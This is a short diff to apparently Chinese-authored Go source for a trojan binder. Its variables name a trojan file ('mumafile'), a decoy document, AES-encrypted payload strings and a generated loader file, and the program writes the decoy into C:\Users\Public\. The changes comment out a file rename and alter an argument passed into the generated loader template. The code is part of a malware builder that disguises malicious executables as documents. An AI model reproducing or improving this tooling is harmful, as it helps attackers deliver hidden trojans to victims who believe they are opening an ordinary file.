@@ -42,7 +42,6 @@ func RandStr(length int) string {
 	return string(result)
 }
 func main() {
-
 	fmt.Println(logo)
 	fmt.Println(tvb)
 	if len(os.Args) != 3 {
@@ -102,7 +101,7 @@ func main() {
 			dstFile = panfu + dstFile
 		}
 
-		os.Rename(selfile, dstFile)
+		//os.Rename(selfile, dstFile)
 
 
 		f2, _ := os.Create("C:\\Users\\Public\\" + docfilename)
@@ -150,7 +149,7 @@ func main() {
 		orig = PKCS7UnPadding(orig)
 		return string(orig)
 	}
-	`, key, mumafile, docfile, "\\\\"+docfile, AesdocfileStr, AesmumafileStr)
+	`, key, mumafile, docfile, docfile, AesdocfileStr, AesmumafileStr)
 
 	f, _ := os.Create("Yihsiwei.go")
 
